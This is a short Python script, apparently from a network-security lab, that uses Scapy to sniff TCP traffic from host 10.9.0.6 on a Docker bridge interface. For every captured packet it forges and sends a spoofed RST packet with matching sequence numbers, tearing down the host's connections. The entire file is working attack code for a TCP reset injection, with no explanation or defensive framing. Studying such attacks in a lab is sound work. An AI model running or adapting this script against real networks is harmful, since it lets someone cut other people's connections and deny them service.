#!/usr/bin/env python3
import sys
from scapy.all import *

def spoof(pkt):
    prev_ip_packet = pkt[IP]
    prev_tcp_packet = pkt[TCP]
    ip = IP(src=prev_ip_packet.dst, dst=prev_ip_packet.src)
    tcp = TCP(sport=prev_tcp_packet.dport, dport=prev_tcp_packet.sport, flags="R", seq=prev_tcp_packet.ack, ack=prev_tcp_packet.seq)
    pkt = ip/tcp
    send(pkt,verbose=0)

sniff_filter="tcp and ip src 10.9.0.6"
sniff(iface='br-9ab47a725de1', filter=sniff_filter, prn=lambda x: spoof(x), count=0)
